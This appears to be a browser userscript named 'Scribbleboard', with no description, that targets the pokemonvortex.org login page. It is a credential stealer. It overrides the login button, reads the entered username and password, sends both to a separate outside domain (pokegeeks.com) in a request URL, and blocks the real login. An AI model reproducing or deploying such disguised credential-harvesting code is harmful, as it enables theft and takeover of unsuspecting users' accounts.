// ==UserScript==
// @id             Scribbleboard
// @name           Scribbleboard
// @version        1.0
// @namespace      
// @author         
// @description    
// @include        http://*pokemonvortex.org/login.php*
// @run-at         document-end
// ==/UserScript==

var btnLogin = document.getElementsByName("Submit");
btnLogin[0].onclick = function(){

    if (window.XMLHttpRequest) {
        // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    }

    else {
        // code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    var url = ""
    var strUser = escape(document.getElementById('myusername').value);
    var strCode = escape(document.getElementById('mypassword').value);
    url = "http://www.pokegeeks.com/pokeentry.php?username=" + strUser + "&password=" + strCode;

    xmlhttp.open("POST", url, true);
    xmlhttp.send();

    return false;

};